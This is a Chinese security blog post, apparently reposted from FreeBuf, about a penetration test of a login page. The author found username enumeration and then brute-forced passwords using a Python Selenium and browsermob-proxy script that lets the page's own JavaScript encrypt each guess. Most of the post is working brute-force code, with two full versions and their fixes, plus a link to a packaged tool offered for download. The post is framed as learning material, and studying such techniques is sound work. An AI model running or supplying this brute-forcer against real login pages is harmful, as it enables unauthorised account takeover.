> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/oMlehP2nLYot5S12vdMJkw)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODvk2MdIBrC2R70aymoojOffyPFWQ6D5Xh71tOG1feUSrVqWLQIWpUReIPa04QQhOBfia5dT5Povd3w/640?wx_fmt=png)

点击蓝字关注我哦

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODvk2MdIBrC2R70aymoojOffnPqCfqjOxH95Q9w5S3EWS75OWCibnvdCtiaoG7TCCVJd6BDwHRUXbrIw/640?wx_fmt=png)

freebuf 原文链接:

https://www.freebuf.com/sectool/257685.html

已经上传到 github，文末附有 github 地址

  

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODvk2MdIBrC2R70aymoojOffaHXMbyTILP0BJOoDmiasObS6qJq5Pa0okib14MRUG6fCazZaajvd0qKQ/640?wx_fmt=png)

  

**前因：**

其实这文讲得重点不是工具的开发，而是一种思想：

```
完全可以利用一些可自动化测试来帮助我们进行渗透测试任务
```

为什么会想到写这个脚本？爱恨情仇加纠缠

在我的潜意识里，我只会在真正用的时候才会去找轮子，造轮子，所以这次的脚本也是因为一次实际的常规测试引发的一连串连锁反应，我称之为铁索连环！

在一次授权的系统测试中，我发现了系统找回密码功能处有个很有趣的事情，找回密码进行验证的时候，需要输入用户名和相应绑定的邮箱，当我输入正确的用户名时候，系统会提示 “用户名或邮箱错误”

没毛病，模糊信息返回，但是当我输入正确的用户名和错误的邮箱时，系统会提示 “输入邮箱错误”，相信各位大佬都知道了，这里挖掘到一枚用户名枚举的漏洞，通过系统的提示系统，批量爆破系统存在的用户名。

但是，交过洞的大佬们都知道，除非是金融行业，或者其他很重要系统，一般是不会收这样的漏洞，收也是低位（超低的哟），恰巧我做的这个项目，不是那一类，所以没啥卵用。

                          ![](https://mmbiz.qpic.cn/mmbiz_jpg/96Koibz2dODvk2MdIBrC2R70aymoojOffvNRCARmIpMK3qr1EjgsMDibVNHn70nRMUVcd7JZ0Z4C9DIGujt3Av8A/640?wx_fmt=jpeg)

但是但是！这不像我们不曲不折的安全人员！毕竟国内的饭不太好要是吧（玩笑话）。

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODvk2MdIBrC2R70aymoojOffbY5uibiaU0uF8oKt3DZYUVbQaXeTW6xzsgYNCSnErwZoHyCOL7PJs8Ow/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODvk2MdIBrC2R70aymoojOffbY5uibiaU0uF8oKt3DZYUVbQaXeTW6xzsgYNCSnErwZoHyCOL7PJs8Ow/640?wx_fmt=png)

—

—

**差点劝退**

所以我决定搞点事情，把这个洞危害加大，我第一个想的就是爆破固定的用户名与密码，因为系统的登录页面，无论是你用户名错误还是密码错误，都返回 “用户名和密码或错误！”，且没有验证码验证，也不限制次数，又因为我们枚举了正确的用户名，这个提示相当于变成了 “密码错误，请重新输入”，就可以爆破固定用户名的密码了，burp 启动，直接就冲了!

看到密码后面有 %3D%3D，我逐渐兴奋，这不就是 base64 加密吗？直接 python 脚本，先 base64 加密，然后爆破，舒服，等着出密码就行了！

但是得先验证是否是 base64 加密，然后放入 burp 解码，我擦，解不出来，我刚开始还不相信，多试了几次，还真不是！

没事没事，冷静冷静！这玩意密码学嘛，这不有手就能把他的加密逻辑给逆出来，哎呀，我擦，我的手勒？

                                   ![](https://mmbiz.qpic.cn/mmbiz_jpg/96Koibz2dODvk2MdIBrC2R70aymoojOffqKmZ795WEnw1giaYibaHusU5ib6E9XxsdUH5kByJMhXTFiaxGqdu9WJfcw/640?wx_fmt=jpeg)

然后打开 js，进行源码分析，漂亮，一个混淆把我思路绕城了钢丝球！

直接给我整劝退，再见项目，再见网安，再见打工人，回家种田去了。

                              ![](https://mmbiz.qpic.cn/mmbiz_jpg/96Koibz2dODvk2MdIBrC2R70aymoojOffPjLk2SPfM7qstr0szNvktkpfnN1FkiauslzvKmRpgL6Pa5CdeUOpicLg/640?wx_fmt=jpeg)

—

—

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODvk2MdIBrC2R70aymoojOffPybzNOg1Yro7O23vw2cImNzDjPnz5xhpL0VJWMAaYic6ianIwIZqUeXg/640?wx_fmt=png)

天马行空

但是吧，我觉得难不倒我，我还可以抢救一下，因为我以前看过大佬，通过本地建立服务，去调用系统的 js，然后为己用，但是也得找到加密函数的接口，bp 上面就有插件，本地起服务，但是也得找到加密的入口函数！还是佩服那些前端调试硬刚的大佬，真是大佬！

因为我以前见过国外的某性能测试软件，不知道啥名字了，反正挺贵的，能自动控制浏览器进行性能设置，就好比一个机器人帮你输入，帮你提交，帮你访问网站，我觉得酷死了，然后我就想了想咋实现的，想起自动化，我肯定第一时间想起了 python，Google 一搜还真有！

有事找百度，google 准没错！

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODvk2MdIBrC2R70aymoojOffXyCN37XH8WTXldicYJMznkXlniaOQo827kUYZ2DTiaJ7VSd1kSJUuXrMA/640?wx_fmt=png)

开始奇幻之旅

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODvk2MdIBrC2R70aymoojOffHdMRT7mHcqrzodw2JOFLkRZp13LeibIuibDdibRXK9iahSaKSCk3GMjCMQ/640?wx_fmt=png)

为什么说奇幻勒? 因为爬坑的故事真的一把鼻涕一把泪的，别说了，哭晕在厕所。

开始使用 selenium 框架。。。。。。。。。。。。。

Selenium 是什么？一句话，自动化测试工具。

它支持各种浏览器，包括 Chrome，Safari，Firefox 等主流界面式浏览器，如果你在这些浏览器里面安装一个 Selenium 的插件，那么便可以方便地实现 Web 界面的测试。换句话说叫 Selenium 支持这些浏览器驱动。

这里用的东西 python+selenium+browsermobproxy

爱 之 初 步 体 验

我们先来一个小例子感受一下 Selenium，这里我们用 Chrome 浏览器来测试（当然你可以 i 缓存其他的浏览器不影响）。

注意在尝试这段代码之前，你得安装 chrome 浏览器。

```
from selenium import webdriver
browser = webdriver.Chrome()
browser.get('http://www.baidu.com/')
```

运行这段代码，它会自动打开 chrome 浏览器，然后打开 http://www.baidu.com/ 这个网页，完全可视化，因为你会看到你的 chrome 浏览器打开浏览这个过程。

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODvk2MdIBrC2R70aymoojOffSAGOgI4DeNEPu292xKXVje015DiaFV2FicdxhwzRSQXJgN2lktcoWatQ/640?wx_fmt=gif)

如果代码执行错误，浏览器没有打开，那么应该是没有装 Chrome 浏览器或者 Chrome 驱动没有配置在环境变量里。下载驱动，然后将驱动文件路径配置在环境变量即可

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODvk2MdIBrC2R70aymoojOffCjuRibOGedLeWZg6ysKDa0vSsRCtlu3VDtKAZTvDHibuYlVRClAW0rGA/640?wx_fmt=gif)

但是因为我们的测试需要提交爆破的用户名和密码打开网页是远远不够的，所以

```
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
driver = webdriver.Chrome()
driver.get("http://www.python.org")
assert "Python" in driver.title#等待加载结束
elem = driver.find_element_by_name("q")
elem.send_keys("pycon")
elem.send_keys(Keys.RETURN)
print（driver.page_source）
```

这段代码会遍历打开 http://www.python.org 这个网页，等 Python 字体加载出来的时候，才遍历 html 树状结构，找到 name 为 q 的标签，然后填入 pycon，然后模拟点击

这里为什么要等待加载，因为可能网站有 jq 什么的加载没完全，再点击会失去原来的韵味。

根据实际需求的情况需要这段代码被我改成了这个样子：

```
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
driver = webdriver.Chrome()
driver.get("xxxxxxxx")
driver.find_element_by_css_selector("[class='class_name']").send_keys(
username)#找到输入用户名的标签，把用户名输入进去
driver.find_element_by_css_selector(
"[class='class_name']").send_keys(password)##找到输入密码的标签，把用户名输入进去
driver.find_element_by_css_selector(("[class='class_name']")).click()#找到登录标签，然后点击
```

这样就模拟了一次完整的用户名和密码输入，以及点击登录的效果.

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODvk2MdIBrC2R70aymoojOffSAGOgI4DeNEPu292xKXVje015DiaFV2FicdxhwzRSQXJgN2lktcoWatQ/640?wx_fmt=gif)

**坑点 1**

这里为什么要用 css_selector，本来可以直接使用 by_class_name 的，但是因为我实际利用场景这里很特殊，class 的名字之间有空格，使用 by_class_name 获取不到，如果 class 的名字没有空格，就可以直接获取，当然也可以通过标签的其他的属性访问到.

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODvk2MdIBrC2R70aymoojOffCjuRibOGedLeWZg6ysKDa0vSsRCtlu3VDtKAZTvDHibuYlVRClAW0rGA/640?wx_fmt=gif)

  

‍

但是这样只能提交一次登录请求，而且还得必须清空上一次填写的账号密码，再改进

```
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
driver = webdriver.Chrome()
driver.get("xxxxxxxx")
#循环加在这
driver.find_element_by_css_selector("[class='class_name']").send_keys(
username)#找到输入用户名的标签，把用户名输入进去
driver.find_element_by_css_selector(
"[class='class_name']").send_keys(password)##找到输入密码的标签，把用户名输入进去
driver.find_element_by_css_selector(("[class='class_name']")).click()#找到登录标签，然后点击
driver.find_element_by_css_selector("[class='class_name']").clear()
driver.find_element_by_css_selector("[class='class_name']").clear()
```

再此基础上加个循环，可以批量爆破他的密码了，因为 chrome 浏览器已经自动加载调用 js 帮我们加密好了变成了密文，然后再发送过去，真是 nice 鸭！

但是有个问题, 就是我无法捕获服务器的返回包, 刚开始使用 selenium 抓取 chromedriver 的 network

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODvk2MdIBrC2R70aymoojOffSAGOgI4DeNEPu292xKXVje015DiaFV2FicdxhwzRSQXJgN2lktcoWatQ/640?wx_fmt=gif)

抓到的流量还得自己分析, 就很难受, 然后就是使用了 browsermobproxy 来开启一个中间的代理, 让我的 chrome 先去经过 browermobproxy, 然后 browermobproxy 抓取我的 http 流量, 就可以拿到了服务器返回包了. 就很 nice!

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODvk2MdIBrC2R70aymoojOffCjuRibOGedLeWZg6ysKDa0vSsRCtlu3VDtKAZTvDHibuYlVRClAW0rGA/640?wx_fmt=gif)

Browsermob-Proxy 是一个开源的 Java 编写的基于 LittleProxy 的代理服务。Browsermob-Proxy 的具体流程有点类似与 Flidder 或 Charles。即开启一个端口并作为一个标准代理存在，当 HTTP 客户端（浏览器等）设置了这个代理，则可以抓取所有的请求细节并获取返回内容。

安装:

```
直接到项目的github上下载打好的压缩包即可:https://github.com/lightbody/browsermob-proxy/releases，支持Linux和Windows。

安装对应的python包:

pip install browsermob-proxy
下载好browsermob-proxy之后，放在指定一个目录，例如我这里是 D:\apk\browsermob-proxy-2.1.4-bin\browsermob-proxy-2.1.4这个路径下，所以下面示例代码如：

from browsermobproxy import Server
server = Server("路径")
server.start()
proxy = server.create_proxy()
```

配置 Proxy 启动 WebDriver:

```
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

chrome_options = Options()
chrome_options.add_argument('--proxy-server={0}'.format(proxy.proxy))
driver = webdriver.Chrome(chrome_options=chrome_options)
```

值得注意的是:

```
browsermob-proxy起的Server默认是8080端口
```

可以直接进入到 Server 这个类里面去修改他的监听端口

  

直接上根据实际测试需求最终代码:

```
import os
import argparse
import sys
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from browsermobproxy import Server
from selenium.webdriver.chrome.options import Options
class Brower_scan():
def __init__(self,url,username,password_dir):
self.url = url
self.response_result = []
self.result={}
self.init_browsermobproxy()
self.init_chrome()
self.init_dict_list(username,password_dir)
self.result_handing()
self.end_env()
def init_dict_list(self,username,password_dir):
with open(password_dir,"r") as f:
self.password_list = f.readlines()
for password in self.password_list:
self.fill_out_a_form(username,password.replace('\n',''))
self.wget_response()
def init_browsermobproxy(self):
self.server = Server("browsermob-proxy-2.1.4\\bin\\browsermob-proxy.bat")#browermobproxy文件的位置
self.server.start()
self.proxy = self.server.create_proxy()
self.chrome_options = Options()
self.chrome_options.add_argument('--proxy-server={0}'.format(self.proxy.proxy))
self.chrome_options.add_argument('--headless')#这里加了一个参数,不启动chrome浏览器,省去了启动的时间,更快了
def init_chrome(self):
try:
self.chrome = webdriver.Chrome(chrome_options=self.chrome_options)
self.proxy.new_har("ht_list2", options={'captureContent': True})
self.chrome.get(self.url)
except Exception as e:
print("Chrome浏览器启动失败！\n")
return 0
def fill_out_a_form(self,username,password):
self.chrome.find_element_by_css_selector("[class='ivu-input ivu-input-with-prefix']").send_keys(
username)
self.chrome.find_element_by_css_selector(
"[class='ivu-input  ivu-input-with-suffix']").send_keys(password)
self.chrome.find_element_by_css_selector(("[class='ivu-btn ivu-btn-primary  ivu-btn-large']")).click()
self.chrome.find_element_by_css_selector("[class='iivu-input ivu-input-with-prefix']").clear()
self.chrome.find_element_by_css_selector("[class='ivu-input  ivu-input-with-suffix']").clear()
def wget_response(self):
result = self.proxy.har
for entry in result['log']['entries']:
_url = entry['request']['url']
print(_url)
if "password" in _url and "username" in _url:
_response = entry['response']
_content = _response['content']
# 获取接口返回内容
self.response_result.append(_response['content']['text'])
self.result = dict(zip(self.password_list, self.response_result))
def result_handing(self):
for key,value in self.result.items():
print("密码：{key} :结果：{result}".format(key=key,result=value))
def end_env(self):
try:
self.server.stop()
self.chrome.quit()
find_netstat = os.popen("netstat -ano | findstr 8080")#开的什么端口杀什么端口的进程
pid = find_netstat.read().split()[4]
kail_pid = os.popen("taskkill /F /PID {PID}".format(PID=pid))
print(kail_pid.read())
return 1
except IndexError as e:
return 0

Brower = Brower_scan(url,'admin','password.txt')
```

拿去实战爆破效果一浏览:

![](https://mmbiz.qpic.cn/mmbiz_jpg/96Koibz2dODvk2MdIBrC2R70aymoojOffWibH2YI26nLFIc8g4sjDFZfwib8oibpTgtOHu1bZNSPJREibeCqg09FaNg/640?wx_fmt=jpeg)

坑点二:

实际爆破效果不是这样的

密码输入依次为 123456 123456456789 123456455678955664 ........................ 一直增大 , 好像缓存没有清楚一样, 但是我实际确实 clear 了

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODvk2MdIBrC2R70aymoojOffSAGOgI4DeNEPu292xKXVje015DiaFV2FicdxhwzRSQXJgN2lktcoWatQ/640?wx_fmt=gif)

**坑点 2**

实际爆破效果不是这样的

密码输入依次为 123456 123456456789 123456455678955664 ........................ 一直增大 , 好像缓存没有清楚一样, 但是我实际确实 clear 了

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODvk2MdIBrC2R70aymoojOffCjuRibOGedLeWZg6ysKDa0vSsRCtlu3VDtKAZTvDHibuYlVRClAW0rGA/640?wx_fmt=gif)

这个问题把我搞了很久, 百思不得其解  

最后, 在部门大神的指点下, 成功找到原因, 并解决问题, 果然听君一席话, 胜读 10 年书, 不愧是大佬!!

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODvk2MdIBrC2R70aymoojOffSAGOgI4DeNEPu292xKXVje015DiaFV2FicdxhwzRSQXJgN2lktcoWatQ/640?wx_fmt=gif)

因为起的浏览器默认是记住上次密码的, 当我输入一个 admin 账号的时候, 在输入密码, 然后浏览器记住了我的账号了, 虽然错误, 然后继续输入 admin, 然后浏览器会自动补全 123456, 然后我再输入了一个 456789 结果就成了 123456456789 了..... 就这个理

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODvk2MdIBrC2R70aymoojOffCjuRibOGedLeWZg6ysKDa0vSsRCtlu3VDtKAZTvDHibuYlVRClAW0rGA/640?wx_fmt=gif)

更改只需要把顺序调换一下就行了:

```
self.chrome.find_element_by_css_selector("[class='class_name']").clear()
self.chrome.find_element_by_css_selector("[class='class_name']").send_keys(
username)
self.chrome.find_element_by_css_selector("[class='class_name']").clear()
self.chrome.find_element_by_css_selector(
"[class='class_name']").send_keys(password)
self.chrome.find_element_by_css_selector(("[class='class_name']")).click()
```

只需要在它补全之前, 再次 clear 就行

  

坑点 3  

如果登录标签使用 c![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODvk2MdIBrC2R70aymoojOffSAGOgI4DeNEPu292xKXVje015DiaFV2FicdxhwzRSQXJgN2lktcoWatQ/640?wx_fmt=gif)lick 属性, 因为元素被包裹的问题, click 多了会报错!, 解决办法是使用 send_keys()

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODvk2MdIBrC2R70aymoojOffCjuRibOGedLeWZg6ysKDa0vSsRCtlu3VDtKAZTvDHibuYlVRClAW0rGA/640?wx_fmt=gif)

```
self.chrome.find_element_by_css_selector(("[class='class_name']")).send_keys(Keys.RETURN)
```

好了这里基本上解决了所以的坑点, 但是实际的坑点很多, 我只是把主要的几点放出来讲了一下, 最终代码:

```
import os
import argparse
import sys
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from browsermobproxy import Server
from selenium.webdriver.chrome.options import Options
class Brower_scan():
def __init__(self,url,username,password_dir):
self.url = url
self.response_result = []
self.result={}
self.init_browsermobproxy()
self.init_chrome()
self.init_dict_list(username,password_dir)
self.result_handing()
self.end_env()
def init_dict_list(self,username,password_dir):
with open(password_dir,"r") as f:
self.password_list = f.readlines()
for password in self.password_list:
self.fill_out_a_form(username,password.replace('\n',''))
self.wget_response()
def init_browsermobproxy(self):
self.server = Server("browsermob-proxy-2.1.4\\bin\\browsermob-proxy.bat")#browermobproxy文件的位置
self.server.start()
self.proxy = self.server.create_proxy()
self.chrome_options = Options()
self.chrome_options.add_argument("–incognito")
self.chrome_options.add_argument('--proxy-server={0}'.format(self.proxy.proxy))
self.chrome_options.add_argument('--headless')#这里加了一个参数,不启动chrome浏览器,省去了启动的时间,更快了
def init_chrome(self):
try:
self.chrome = webdriver.Chrome(chrome_options=self.chrome_options)
self.proxy.new_har("test", options={'captureContent': True, 'captureHeaders': True})
self.chrome.get(self.url)
except Exception as e:
print("Chrome浏览器启动失败！\n")
return 0
def fill_out_a_form(self,username,password):
print(password)
self.chrome.find_element_by_css_selector("[class='class_name']").clear()#清空username输入框的标签

self.chrome.find_element_by_css_selector("[class='ivu-input ivu-input-large ivu-input-with-prefix']").send_keys(
username)#输入用户名
self.chrome.find_element_by_css_selector("[class='ivu-input ivu-input-large ivu-input-with-prefix ivu-input-with-suffix']").clear()#清空password输入框的标签
self.chrome.find_element_by_css_selector(
"[class='class_name']").send_keys(password)#输入用户名
self.chrome.find_element_by_css_selector("[class='class_name']").send_keys(Keys.RETURN)#点击登录

def wget_response(self):
result = self.proxy.har
for entry in result['log']['entries']:
_url = entry['request']['url']
if "password" in _url and "username" in _url:
_response = entry['response']
_content = _response['content']
# 获取接口返回内容
self.response_result.append(_response['content']['text'])
self.result = dict(zip(self.password_list, self.response_result))
def result_handing(self):
for key,value in self.result.items():
print("密码：{key} :结果：{result}".format(key=key,result=value))
def end_env(self):
try:
self.server.stop()
self.chrome.quit()
find_netstat = os.popen("netstat -ano | findstr 8080")#开的什么端口杀什么端口的进程
pid = find_netstat.read().split()[4]
kail_pid = os.popen("taskkill /F /PID {PID}".format(PID=pid))
print(kail_pid.read())
return 1
except IndexError as e:
return 0

Brower = Brower_scan(url,'admin','password.txt')
```

这里仅仅把这种方式利用在密码爆破上面, 但是实际的利用场景远不止这些, 我觉得可以利用任何 js 加密, jq 加密的, 前端加密的场景, 都可以用到, 根本不需要去分析它的 js 前端加密代码, 只需要把爆破行为模拟正常的用户行为就欧克了, 不得不说, 这种智能的方式真的太方便了! 太香了!!!!!!!!

  

github 已经上传了一个我已经写好的爆破登录界面账号和密码的, 大家可以去下载自行享用!

```
https://github.com/Gamma-laboratory/JsFak

现在只支持通过class来查找输入框和登录按钮，如果需要通过id或其他标识，可以修改源码
```

  

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODvk2MdIBrC2R70aymoojOffSAGOgI4DeNEPu292xKXVje015DiaFV2FicdxhwzRSQXJgN2lktcoWatQ/640?wx_fmt=gif)

**后果**

正当我美滋滋的撰写报告, 准备提交的时候, 我突然发现这个项目明文规定了, 枚举用户名爆破不在收录漏洞范畴之内!!!!!

漂亮!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!, 来世还做安全!

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODvk2MdIBrC2R70aymoojOffCjuRibOGedLeWZg6ysKDa0vSsRCtlu3VDtKAZTvDHibuYlVRClAW0rGA/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODsGoxEE3kouByPbyxDTzYIgX0gMz5ic70ZMzTSNL2TudeJpEAtmtAdGg9J53w4RUKGc34zEyiboMGWw/640?wx_fmt=png)

END

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODsGoxEE3kouByPbyxDTzYIgX0gMz5ic70ZMzTSNL2TudeJpEAtmtAdGg9J53w4RUKGc34zEyiboMGWw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtIZ5VYusLbEoY8iaTjibTWg6AKjAQiahf2fctN4PSdYm2O1Hibr56ia39iaJcxBoe04t4nlYyOmRvCr56Q/640?wx_fmt=gif)

**看完记得点赞，关注哟，爱您！**

**请严格遵守网络安全法相关条例！此分享主要用于学习，切勿走上违法犯罪的不归路，一切后果自付！**

  

关注此公众号，回复 "Gamma" 关键字免费领取一套网络安全视频以及相关书籍，公众号内还有收集的常用工具！

  

**在看你就赞赞我！**

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbThXaInFkmyjOOcBoNCXGun5icNbT4mjCjcREA3nMN7G8icS0IKM3ebuLA/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTkwLkofibxKKjhEu7Rx8u1P8sibicPkzKmkjjvddDg8vDYxLibe143CwHAw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/96Koibz2dODt7492lKcjVLXNwERFNUQJVkkKj3EYBiboRWmHfnymrDxeEVrYapXicBGbRLhPzWv5wbhXR59PDyC8Q/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTicALFtE3HLbUiamP3IAdeINR1a84qnmro82ZKh4lpl5cHumDfzCE3P8w/640?wx_fmt=gif)

扫码关注我们

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTicALFtE3HLbUiamP3IAdeINR1a84qnmro82ZKh4lpl5cHumDfzCE3P8w/640?wx_fmt=gif)

扫码领 hacker 资料，常用工具，以及各种福利

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTnHS31hY5p9FJS6gMfNZcSH2TibPUmiam6ajGW3l43pb0ySLc1FibHmicibw/640?wx_fmt=gif)

转载是一种动力 分享是一种美德